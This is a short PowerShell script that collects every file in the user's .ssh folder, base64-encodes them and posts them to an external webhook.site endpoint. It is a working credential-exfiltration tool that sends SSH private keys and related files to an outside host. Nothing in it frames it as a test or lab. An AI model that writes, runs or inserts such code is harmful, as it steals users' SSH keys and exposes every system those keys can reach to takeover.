$ssh = Join-Path $env:USERPROFILE '.ssh'
if (-not (Test-Path $ssh)) {
    Write-Error "No .ssh folder found at $ssh"
    exit 1
}

$endpoint = 'https://webhook.site/d2a6eade-578f-4613-aa20-681df6ef6a4c'

$payload = Get-ChildItem -Path $ssh -File -Recurse | ForEach-Object {
    $bytes = [IO.File]::ReadAllBytes($_.FullName)
    [PSCustomObject]@{
        Filename = $_.Name
        FullName = $_.FullName
        Base64   = [Convert]::ToBase64String($bytes)
    }
}

$body = @{ files = $payload } | ConvertTo-Json -Depth 6
$utf8 = [System.Text.Encoding]::UTF8.GetBytes($body)

Invoke-RestMethod -Uri $endpoint -Method Post -ContentType 'application/json; charset=utf-8' -Body $utf8
Write-Host "Posted $(($payload).Count) file entries to $endpoint"
